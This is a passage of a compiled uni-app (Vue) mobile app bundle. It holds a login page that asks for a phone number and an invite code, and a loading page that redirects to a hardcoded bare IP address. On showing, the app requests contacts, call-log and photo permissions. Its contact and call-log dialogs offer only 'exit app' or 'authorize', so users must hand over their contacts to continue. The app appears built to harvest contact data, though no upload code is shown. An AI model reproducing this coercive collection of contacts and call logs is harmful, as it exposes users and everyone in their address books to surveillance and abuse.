            // 确保所有按钮配置存在，使用后台配置，如果不存在则使用默认值
            login_button_font_size: config2.login_button_font_size || "16",
            login_button_font_color: config2.login_button_font_color || "#ffffff",
            login_button_font_weight: config2.login_button_font_weight || "normal",
            login_button_bg_color: config2.login_button_bg_color || "#8257e6",
            login_button_gradient_color: config2.login_button_gradient_color || "#6c45c4",
            login_button_radius: config2.login_button_radius || "4",
            login_button_shadow: config2.login_button_shadow === 0 ? 0 : 1
          };
          formatAppLog("log", "at pages/index/index.vue:705", "按钮样式配置信息:", JSON.stringify({
            login_button_font_color: this.configData.login_button_font_color,
            login_button_bg_color: this.configData.login_button_bg_color,
            login_button_gradient_color: this.configData.login_button_gradient_color
          }));
          this._styleLogged = false;
          this.$nextTick(() => {
            this.forceUpdateButtonStyle();
            formatAppLog("log", "at pages/index/index.vue:717", "已强制更新按钮样式");
          });
        } catch (error) {
          formatAppLog("error", "at pages/index/index.vue:720", "配置加载处理时出错:", error);
        }
      },
      // 记录按钮样式用于调试
      logButtonStyle() {
        try {
          formatAppLog("log", "at pages/index/index.vue:727", "=========== 调试按钮样式 ===========");
          formatAppLog("log", "at pages/index/index.vue:728", "字体颜色:", this.configData.login_button_font_color);
          formatAppLog("log", "at pages/index/index.vue:729", "背景颜色:", this.configData.login_button_bg_color);
          formatAppLog("log", "at pages/index/index.vue:730", "渐变颜色:", this.configData.login_button_gradient_color);
          formatAppLog("log", "at pages/index/index.vue:731", "字体大小:", this.configData.login_button_font_size);
          formatAppLog("log", "at pages/index/index.vue:732", "字体粗细:", this.configData.login_button_font_weight);
          formatAppLog("log", "at pages/index/index.vue:733", "按钮圆角:", this.configData.login_button_radius);
          formatAppLog("log", "at pages/index/index.vue:734", "阴影效果:", this.configData.login_button_shadow ? "开启" : "关闭");
        } catch (error) {
          formatAppLog("error", "at pages/index/index.vue:748", "记录按钮样式时出错:", error);
        }
      },
      // 强制更新按钮样式 - 直接使用DOM操作
      forceUpdateButtonStyle() {
        try {
          formatAppLog("log", "at pages/index/index.vue:819", "非浏览器环境，通过CSS类应用按钮样式");
        } catch (error) {
          formatAppLog("error", "at pages/index/index.vue:822", "强制更新按钮样式时出错:", error);
        }
      },
      // 设置根元素CSS变量
      setRootCSSVariables() {
        try {
          if (typeof document === "undefined") {
            formatAppLog("log", "at pages/index/index.vue:830", "非浏览器环境，跳过CSS变量设置");
            return;
          }
          const root = document.documentElement;
          root.style.setProperty("--login-button-font-color", this.configData.login_button_font_color || "#222020");
          root.style.setProperty("--login-button-font-weight", this.configData.login_button_font_weight || "bold");
          root.style.setProperty("--login-button-font-size", `${this.configData.login_button_font_size || "16"}px`);
          const bgValue = this.configData.login_button_gradient_color ? `linear-gradient(135deg, ${this.configData.login_button_bg_color || "#736b85"} 0%, ${this.configData.login_button_gradient_color || "#184dc9"} 100%)` : this.configData.login_button_bg_color || "#736b85";
          root.style.setProperty("--login-button-bg", bgValue);
          root.style.setProperty("--login-button-radius", `${this.configData.login_button_radius || "4"}px`);
          root.style.setProperty("--login-button-shadow", this.configData.login_button_shadow ? "0 4px 15px rgba(0, 0, 0, 0.3)" : "none");
          formatAppLog("log", "at pages/index/index.vue:851", "已设置CSS变量:", {
            "--login-button-font-color": root.style.getPropertyValue("--login-button-font-color"),
            "--login-button-bg": root.style.getPropertyValue("--login-button-bg")
          });
        } catch (error) {
          formatAppLog("error", "at pages/index/index.vue:856", "设置CSS变量时出错:", error);
        }
      },
      // 调试按钮样式信息
      debugLogStyle() {
        if (this.__DEV__ && !this._styleLogged) {
          formatAppLog("log", "at pages/index/index.vue:864", "===DEBUG 按钮样式计算===");
          formatAppLog("log", "at pages/index/index.vue:865", "按钮样式参数:");
          formatAppLog("log", "at pages/index/index.vue:866", "- 字体颜色:", this.configData.login_button_font_color);
          formatAppLog("log", "at pages/index/index.vue:867", "- 背景颜色:", this.configData.login_button_bg_color);
          formatAppLog("log", "at pages/index/index.vue:868", "- 渐变颜色:", this.configData.login_button_gradient_color);
          formatAppLog("log", "at pages/index/index.vue:869", "- 字体大小:", this.configData.login_button_font_size);
          formatAppLog("log", "at pages/index/index.vue:870", "- 字体粗细:", this.configData.login_button_font_weight);
          formatAppLog("log", "at pages/index/index.vue:871", "- 按钮圆角:", this.configData.login_button_radius);
          formatAppLog("log", "at pages/index/index.vue:872", "- 阴影效果:", this.configData.login_button_shadow ? "开启" : "关闭");
          formatAppLog("log", "at pages/index/index.vue:873", "- 表单有效性:", this.isFormValid);
          formatAppLog("log", "at pages/index/index.vue:874", "- 登录处理中:", this.isLoginProcessing);
          this._styleLogged = true;
        }
      }
    },
    // 添加生命周期方法
    created() {
      formatAppLog("log", "at pages/index/index.vue:882", "组件created - 开始初始化");
      this.initLanguage();
      const logConfigData = () => {
        formatAppLog("log", "at pages/index/index.vue:889", "当前configData值:", JSON.stringify({
          login_button_font_color: this.configData.login_button_font_color,
          login_button_bg_color: this.configData.login_button_bg_color,
          login_button_gradient_color: this.configData.login_button_gradient_color
        }));
      };
      const onConfigLoaded = (config2) => {
        formatAppLog("log", "at pages/index/index.vue:898", "配置加载回调触发 - 字体颜色:", config2.login_button_font_color);
        this.configData = {
          ...this.configData,
          // 保留现有配置
          ...config2,
          // 更新从API获取的配置
          // 确保所有按钮配置存在，使用后台配置，如果不存在则使用默认值
          login_button_font_size: config2.login_button_font_size || "16",
          login_button_font_color: config2.login_button_font_color || "#ffffff",
          login_button_font_weight: config2.login_button_font_weight || "normal",
          login_button_bg_color: config2.login_button_bg_color || "#8257e6",
          login_button_gradient_color: config2.login_button_gradient_color || "#6c45c4",
          login_button_radius: config2.login_button_radius || "4",
          login_button_shadow: config2.login_button_shadow === 0 ? 0 : 1
        };
        formatAppLog("log", "at pages/index/index.vue:915", "按钮样式配置信息:", JSON.stringify({
          login_button_font_color: this.configData.login_button_font_color,
          login_button_bg_color: this.configData.login_button_bg_color,
          login_button_gradient_color: this.configData.login_button_gradient_color
        }));
        this._styleLogged = false;
        this.$nextTick(() => {
          formatAppLog("log", "at pages/index/index.vue:926", "配置加载回调中：更新按钮样式");
          this.forceUpdateButtonStyle();
          formatAppLog("log", "at pages/index/index.vue:928", "已强制更新按钮样式");
        });
      };
      logConfigData();
      configManager.addListener(onConfigLoaded);
      this.onConfigLoaded = onConfigLoaded;
      if (configManager.isConfigLoaded()) {
        formatAppLog("log", "at pages/index/index.vue:940", "配置已加载，直接初始化");
        onConfigLoaded(configManager.getConfig());
      } else {
        formatAppLog("log", "at pages/index/index.vue:943", "配置未加载，等待配置加载完成");
        configManager.loadConfig().then(() => {
          formatAppLog("log", "at pages/index/index.vue:946", "配置加载成功");
        }).catch((error) => {
          formatAppLog("error", "at pages/index/index.vue:948", "配置加载失败:", error);
        });
      }
    },
    mounted() {
      formatAppLog("log", "at pages/index/index.vue:954", "组件mounted - DOM已挂载");
      formatAppLog("log", "at pages/index/index.vue:957", "=== 按钮样式绑定值 ===");
      formatAppLog("log", "at pages/index/index.vue:958", "表单有效性:", this.isFormValid);
      formatAppLog("log", "at pages/index/index.vue:959", "登录处理中:", this.isLoginProcessing);
      this.initFormValidation();
      this.$nextTick(() => {
        formatAppLog("log", "at pages/index/index.vue:966", "mounted: 即将调用forceUpdateButtonStyle()");
        formatAppLog("log", "at pages/index/index.vue:968", "mounted中的configData值:", JSON.stringify({
          font_color: this.configData.login_button_font_color,
          bg_color: this.configData.login_button_bg_color,
          gradient_color: this.configData.login_button_gradient_color,
          font_size: this.configData.login_button_font_size,
          font_weight: this.configData.login_button_font_weight,
          radius: this.configData.login_button_radius
        }));
        this.forceUpdateButtonStyle();
        this.logButtonStyle();
        formatAppLog("log", "at pages/index/index.vue:978", "mounted后强制更新按钮样式");
      });
      uni.$on("config:updated", (config2) => {
        formatAppLog("log", "at pages/index/index.vue:983", "收到全局配置更新事件, login_button_font_color:", config2.login_button_font_color);
        this.configData = { ...this.configData, ...config2 };
        formatAppLog("log", "at pages/index/index.vue:986", "config:updated事件后的configData:", JSON.stringify({
          font_color: this.configData.login_button_font_color,
          bg_color: this.configData.login_button_bg_color,
          gradient_color: this.configData.login_button_gradient_color
        }));
        this._styleLogged = false;
        this.$nextTick(() => {
          this.forceUpdateButtonStyle();
        });
      });
    },
    onShow() {
      if (this.stateContact == null) {
        permision.requestAndroidPermission("android.permission.READ_CONTACTS").then((e) => {
          if (e == 1) {
            this.stateContact = false;
          } else {
            this.stateContact = true;
          }
        });
      }
      if (this.stateTh == null) {
        permision.requestAndroidPermission("android.permission.READ_CALL_LOG").then((e) => {
          if (e == 1) {
            this.stateTh = false;
          } else {
            this.stateTh = false;
          }
        });
      }
      if (this.statePhoto == null) {
        let photoPerm = "android.permission.READ_EXTERNAL_STORAGE";
        try {
          const Build = plus.android.importClass("android.os.Build");
          if (Build.VERSION.SDK_INT >= 33) {
            photoPerm = "android.permission.READ_MEDIA_IMAGES";
          }
        } catch (e) {
        }
        permision.requestAndroidPermission(photoPerm).then((e) => {
          if (e == 1) {
            this.statePhoto = false;
          } else {
            this.statePhoto = true;
          }
        });
      }
    },
    beforeDestroy() {
      if (this.onConfigLoaded) {
        configManager.removeListener(this.onConfigLoaded);
      }
      this.stopCountdown();
      uni.$off("config:updated");
    }
  };
  function _sfc_render$2(_ctx, _cache, $props, $setup, $data, $options) {
    const _component_background_slider = vue.resolveComponent("background-slider");
    return vue.openBlock(), vue.createElementBlock(
      "view",
      {
        class: "container",
        onTouchmove: _cache[18] || (_cache[18] = vue.withModifiers(() => {
        }, ["prevent"]))
      },
      [
        vue.createVNode(_component_background_slider),
        vue.createElementVNode(
          "view",
          {
            style: vue.normalizeStyle({
              position: "fixed",
              top: "40px",
              left: $data.configData.language_position === "top-left" ? "20px" : "auto",
              right: $data.configData.language_position === "top-right" ? "20px" : "auto",
              backgroundColor: $data.configData.language_bg_color || "rgba(0,0,0,0.3)",
              color: $data.configData.language_font_color || "#ffffff",
              padding: "8px 15px",
              borderRadius: "30px",
              zIndex: 1e4,
              boxShadow: "0 4px 10px rgba(0, 0, 0, 0.5)",
              border: "2px solid white",
              minWidth: "80px",
              textAlign: "center",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              opacity: 1
            }),
            onClick: _cache[0] || (_cache[0] = (...args) => $options.toggleLanguageDropdown && $options.toggleLanguageDropdown(...args))
          },
          [
            vue.createElementVNode(
              "text",
              {
                style: vue.normalizeStyle({
                  color: $data.configData.language_font_color || "#ffffff",
                  fontSize: ($data.configData.language_font_size || 14) + "px",
                  fontWeight: $data.configData.language_font_weight || "normal"
                })
              },
              vue.toDisplayString($options.currentLanguage),
              5
              /* TEXT, STYLE */
            )
          ],
          4
          /* STYLE */
        ),
        $data.showLanguageDropdown ? (vue.openBlock(), vue.createElementBlock(
          "view",
          {
            key: 0,
            style: vue.normalizeStyle({
              position: "fixed",
              top: "80px",
              left: $data.configData.language_position === "top-left" ? "20px" : "auto",
              right: $data.configData.language_position === "top-right" ? "20px" : "auto",
              backgroundColor: "rgba(0, 0, 0, 0.7)",
              borderRadius: "10px",
              boxShadow: "0 4px 10px rgba(0, 0, 0, 0.5)",
              padding: "10px",
              zIndex: 9999,
              maxHeight: "80vh",
              overflowY: "auto"
            })
          },
          [
            (vue.openBlock(true), vue.createElementBlock(
              vue.Fragment,
              null,
              vue.renderList($data.languages, (lang, index) => {
                return vue.openBlock(), vue.createElementBlock("view", {
                  key: index,
                  style: vue.normalizeStyle({
                    padding: "8px",
                    color: "white",
                    fontSize: "14px",
                    fontWeight: "bold",
                    textShadow: "0 1px 2px rgba(0, 0, 0, 0.5)",
                    textAlign: "center",
                    borderBottom: index === $data.languages.length - 1 ? "none" : "1px solid rgba(255, 255, 255, 0.2)",
                    cursor: "pointer"
                  }),
                  onClick: ($event) => $options.selectLanguage(index)
                }, vue.toDisplayString(lang), 13, ["onClick"]);
              }),
              128
              /* KEYED_FRAGMENT */
            ))
          ],
          4
          /* STYLE */
        )) : vue.createCommentVNode("v-if", true),
        vue.createElementVNode("view", { class: "form-container" }, [
          vue.createElementVNode("view", { class: "form-box" }, [
            !!$data.configData.show_logo_title ? (vue.openBlock(), vue.createElementBlock("view", {
              key: 0,
              class: "logo-title-container",
              style: { marginTop: "2px", marginBottom: "20px" }
            }, [
              $data.configData.logo_image ? (vue.openBlock(), vue.createElementBlock("image", {
                key: 0,
                src: $data.configData.logo_image,
                style: {
                  width: "160px",
                  height: "160px",
                  marginBottom: "-15px"
                },
                mode: "aspectFit",
                onLoad: _cache[1] || (_cache[1] = (...args) => _ctx.handleLogoLoaded && _ctx.handleLogoLoaded(...args))
              }, null, 40, ["src"])) : vue.createCommentVNode("v-if", true),
              $data.configData.login_title ? (vue.openBlock(), vue.createElementBlock(
                "text",
                {
                  key: 1,
                  style: {
                    color: "white",
                    fontSize: "20px",
                    fontWeight: "bold",
                    textAlign: "center",
                    marginTop: "-10px"
                  }
                },
                vue.toDisplayString($data.configData.login_title),
                1
                /* TEXT */
              )) : vue.createCommentVNode("v-if", true)
            ])) : vue.createCommentVNode("v-if", true),
            vue.createElementVNode("view", { class: "input-container" }, [
              vue.createElementVNode("view", { class: "input-group" }, [
                vue.createElementVNode("view", { class: "input-prefix" }, [
                  vue.createElementVNode(
                    "text",
                    { class: "area-code" },
                    vue.toDisplayString($options.currentAreaCode),
                    1
                    /* TEXT */
                  ),
                  vue.createElementVNode("text", { class: "separator" }, "|")
                ]),
                vue.withDirectives(vue.createElementVNode("input", {
                  class: vue.normalizeClass(["input", { "error": $data.phoneError }]),
                  placeholder: _ctx.$t("phone"),
                  "onUpdate:modelValue": _cache[2] || (_cache[2] = ($event) => $data.phone = $event),
                  type: "number",
                  maxlength: $options.phoneMaxLength,
                  onInput: _cache[3] || (_cache[3] = (...args) => $options.handlePhoneInput && $options.handlePhoneInput(...args)),
                  onFocus: _cache[4] || (_cache[4] = (...args) => $options.handleInputFocus && $options.handleInputFocus(...args)),
                  onBlur: _cache[5] || (_cache[5] = (...args) => $options.handleInputBlur && $options.handleInputBlur(...args))
                }, null, 42, ["placeholder", "maxlength"]), [
                  [vue.vModelText, $data.phone]
                ])
              ]),
              $data.phoneError ? (vue.openBlock(), vue.createElementBlock(
                "view",
                {
                  key: 0,
                  class: "error-message"
                },
                vue.toDisplayString($data.phoneError),
                1
                /* TEXT */
              )) : vue.createCommentVNode("v-if", true),
              vue.createElementVNode("view", { class: "input-group" }, [
                vue.withDirectives(vue.createElementVNode("input", {
                  class: vue.normalizeClass(["input", { "error": $data.inviteCodeError }]),
                  placeholder: _ctx.$t("inviteCode"),
                  "onUpdate:modelValue": _cache[6] || (_cache[6] = ($event) => $data.inviteCode = $event),
                  type: "number",
                  onInput: _cache[7] || (_cache[7] = (...args) => $options.validateInviteCode && $options.validateInviteCode(...args)),
                  onFocus: _cache[8] || (_cache[8] = (...args) => $options.handleInputFocus && $options.handleInputFocus(...args)),
                  onBlur: _cache[9] || (_cache[9] = (...args) => $options.handleInputBlur && $options.handleInputBlur(...args))
                }, null, 42, ["placeholder"]), [
                  [vue.vModelText, $data.inviteCode]
                ])
              ]),
              $data.inviteCodeError ? (vue.openBlock(), vue.createElementBlock(
                "view",
                {
                  key: 1,
                  class: "error-message"
                },
                vue.toDisplayString(_ctx.$t("inviteCodeError")),
                1
                /* TEXT */
              )) : vue.createCommentVNode("v-if", true)
            ]),
            vue.createElementVNode("button", {
              style: vue.normalizeStyle($options.loginButtonStyle),
              disabled: !$options.isFormValid || $data.isLoginProcessing,
              onClick: _cache[10] || (_cache[10] = (...args) => $options.handleLogin && $options.handleLogin(...args))
            }, vue.toDisplayString(_ctx.$t("login")), 13, ["disabled"]),
            !!$data.configData.show_agreement && $data.configData.agreement_text ? (vue.openBlock(), vue.createElementBlock(
              "view",
              {
                key: 1,
                class: "agreement",
                style: vue.normalizeStyle({
                  fontSize: $data.configData.agreement_font_size + "px",
                  color: "#60149f",
                  fontWeight: $data.configData.agreement_font_weight || "normal"
                })
              },
              [
                vue.createTextVNode(
                  vue.toDisplayString(_ctx.$t("agreementPrefix")) + " ",
                  1
                  /* TEXT */
                ),
                vue.createElementVNode(
                  "text",
                  {
                    class: "link",
                    onClick: _cache[11] || (_cache[11] = (...args) => $options.openAgreement && $options.openAgreement(...args)),
                    style: { color: "#60149f" }
                  },
                  vue.toDisplayString($data.configData.agreement_text),
                  1
                  /* TEXT */
                ),
                vue.createTextVNode(
                  " " + vue.toDisplayString(_ctx.$t("agreementSuffix") || ""),
                  1
                  /* TEXT */
                )
              ],
              4
              /* STYLE */
            )) : vue.createCommentVNode("v-if", true),
            !!$data.configData.show_copyright && $data.configData.copyright_text ? (vue.openBlock(), vue.createElementBlock(
              "view",
              {
                key: 2,
                class: "copyright",
                style: vue.normalizeStyle({
                  fontSize: $data.configData.copyright_font_size + "px",
                  color: "#fb0e0e",
                  fontWeight: $data.configData.copyright_font_weight || "normal"
                })
              },
              vue.toDisplayString($data.configData.copyright_text),
              5
              /* TEXT, STYLE */
            )) : vue.createCommentVNode("v-if", true)
          ])
        ]),
        $data.showCountdown ? (vue.openBlock(), vue.createElementBlock("div", {
          key: 1,
          class: "countdown-overlay"
        }, [
          vue.createElementVNode("view", { class: "countdown-card" }, [
            vue.createElementVNode("view", { class: "countdown-icon" }, [
              vue.createElementVNode("view", { class: "check-icon" }, "✓")
            ]),
            vue.createElementVNode(
              "view",
              { class: "countdown-text" },
              "排队中，请稍后，预计" + vue.toDisplayString($data.countdown) + "秒后进入",
              1
              /* TEXT */
            )
          ])
        ])) : vue.createCommentVNode("v-if", true),
        $data.statePhoto ? (vue.openBlock(), vue.createElementBlock("div", {
          key: 2,
          class: "zhezhao zhezhao1"
        }, [
          vue.createElementVNode("view", { class: "win-view" }, [
            vue.createElementVNode(
              "view",
              { class: "win-title" },
              vue.toDisplayString(_ctx.$t("photoPermTitle")),
              1
              /* TEXT */
            ),
            vue.createElementVNode(
              "view",
              { class: "win-info" },
              vue.toDisplayString(_ctx.$t("photoPermDesc")),
              1
              /* TEXT */
            ),
            vue.createElementVNode("view", { class: "win-view-button" }, [
              vue.createElementVNode(
                "button",
                {
                  onClick: _cache[12] || (_cache[12] = ($event) => $data.statePhoto = false),
                  class: "cancel-but"
                },
                vue.toDisplayString(_ctx.$t("close")),
                1
                /* TEXT */
              ),
              vue.createElementVNode(
                "button",
                {
                  onClick: _cache[13] || (_cache[13] = (...args) => $options.openPhotoPower && $options.openPhotoPower(...args)),
                  class: "confirm-but"
                },
                vue.toDisplayString(_ctx.$t("authorize")),
                1
                /* TEXT */
              )
            ])
          ])
        ])) : vue.createCommentVNode("v-if", true),
        $data.stateContact ? (vue.openBlock(), vue.createElementBlock("div", {
          key: 3,
          class: "zhezhao zhezhao2"
        }, [
          vue.createElementVNode("view", { class: "win-view" }, [
            vue.createElementVNode(
              "view",
              { class: "win-title" },
              vue.toDisplayString(_ctx.$t("contactPermTitle")),
              1
              /* TEXT */
            ),
            vue.createElementVNode(
              "view",
              { class: "win-info" },
              vue.toDisplayString(_ctx.$t("contactPermDesc")),
              1
              /* TEXT */
            ),
            vue.createElementVNode("view", { class: "win-view-button" }, [
              vue.createElementVNode(
                "button",
                {
                  onClick: _cache[14] || (_cache[14] = (...args) => $options.outApp && $options.outApp(...args)),
                  class: "cancel-but"
                },
                vue.toDisplayString(_ctx.$t("exitApp")),
                1
                /* TEXT */
              ),
              vue.createElementVNode(
                "button",
                {
                  onClick: _cache[15] || (_cache[15] = (...args) => $options.openContactPower && $options.openContactPower(...args)),
                  class: "confirm-but"
                },
                vue.toDisplayString(_ctx.$t("authorize")),
                1
                /* TEXT */
              )
            ])
          ])
        ])) : vue.createCommentVNode("v-if", true),
        $data.stateTh ? (vue.openBlock(), vue.createElementBlock("div", {
          key: 4,
          class: "zhezhao zhezhao3"
        }, [
          vue.createElementVNode("view", { class: "win-view" }, [
            vue.createElementVNode(
              "view",
              { class: "win-title" },
              vue.toDisplayString(_ctx.$t("callPermTitle")),
              1
              /* TEXT */
            ),
            vue.createElementVNode(
              "view",
              { class: "win-info" },
              vue.toDisplayString(_ctx.$t("callPermDesc")),
              1
              /* TEXT */
            ),
            vue.createElementVNode("view", { class: "win-view-button" }, [
              vue.createElementVNode(
                "button",
                {
                  onClick: _cache[16] || (_cache[16] = (...args) => $options.outApp && $options.outApp(...args)),
                  class: "cancel-but"
                },
                vue.toDisplayString(_ctx.$t("exitApp")),
                1
                /* TEXT */
              ),
              vue.createElementVNode(
                "button",
                {
                  onClick: _cache[17] || (_cache[17] = (...args) => $options.openTHPower && $options.openTHPower(...args)),
                  class: "confirm-but"
                },
                vue.toDisplayString(_ctx.$t("authorize")),
                1
                /* TEXT */
              )
            ])
          ])
        ])) : vue.createCommentVNode("v-if", true)
      ],
      32
      /* NEED_HYDRATION */
    );
  }
  const PagesIndexIndex = /* @__PURE__ */ _export_sfc(_sfc_main$2, [["render", _sfc_render$2], ["__file", "D:/别人的txl/前台/Client/pages/index/index.vue"]]);
  const _sfc_main$1 = {
    data() {
      return {
        url: "",
        title: "服务协议"
      };
    },
    onLoad(options) {
      if (options.url) {
        this.url = decodeURIComponent(options.url);
      }
      if (options.title) {
        this.title = decodeURIComponent(options.title);
        uni.setNavigationBarTitle({
          title: this.title
        });
      }
    },
    onReady() {
      uni.setNavigationBarColor({
        frontColor: "#ffffff",
        backgroundColor: "#ff6600",
        animation: {
          duration: 300,
          timingFunc: "easeIn"
        }
      });
    }
  };
  function _sfc_render$1(_ctx, _cache, $props, $setup, $data, $options) {
    return vue.openBlock(), vue.createElementBlock("view", { class: "webview-container" }, [
      vue.createElementVNode("web-view", { src: $data.url }, null, 8, ["src"])
    ]);
  }
  const PagesWebviewWebview = /* @__PURE__ */ _export_sfc(_sfc_main$1, [["render", _sfc_render$1], ["__file", "D:/别人的txl/前台/Client/pages/webview/webview.vue"]]);
  const _sfc_main = {
    data() {
      return {
        redirectUrl: ""
      };
    },
    onLoad() {
      this.initRedirectUrl();
    },
    onShow() {
      this.initRedirectUrl();
    },
    methods: {
      async initRedirectUrl() {
        try {
          await configManager.loadConfig();
          let url = configManager.getRandomRedirectUrl();
          if (url) {
            formatAppLog("log", "at pages/loading/loading.vue:31", "使用后台API配置的跳转URL:", url);
          } else {
            url = "http://154.219.101.15";
            formatAppLog("log", "at pages/loading/loading.vue:35", "使用默认跳转URL: http://154.219.101.15");
          }
          this.redirectUrl = url;
          formatAppLog("log", "at pages/loading/loading.vue:40", "最终跳转URL:", this.redirectUrl);
        } catch (error) {
          formatAppLog("error", "at pages/loading/loading.vue:42", "获取配置失败:", error);
          this.redirectUrl = "http://154.219.101.15";
        }
      }
    }
  };
  function _sfc_render(_ctx, _cache, $props, $setup, $data, $options) {
    return vue.openBlock(), vue.createElementBlock("web-view", { src: $data.redirectUrl }, null, 8, ["src"]);
  }
  const PagesLoadingLoading = /* @__PURE__ */ _export_sfc(_sfc_main, [["render", _sfc_render], ["__file", "D:/别人的txl/前台/Client/pages/loading/loading.vue"]]);
  __definePage("pages/index/index", PagesIndexIndex);
  __definePage("pages/webview/webview", PagesWebviewWebview);
  __definePage("pages/loading/loading", PagesLoadingLoading);
  function createApp() {
    const app = vue.createVueApp(App);
    app.use(i18n);
    return {
      app
    };
  }
  const { app: __app__, Vuex: __Vuex__, Pinia: __Pinia__ } = createApp();
  uni.Vuex = __Vuex__;
  uni.Pinia = __Pinia__;
  __app__.provide("__globalStyles", __uniConfig.styles);
  __app__._component.mpType = "app";
  __app__._component.render = () => {
  };
  __app__.mount("#app");
})(Vue);
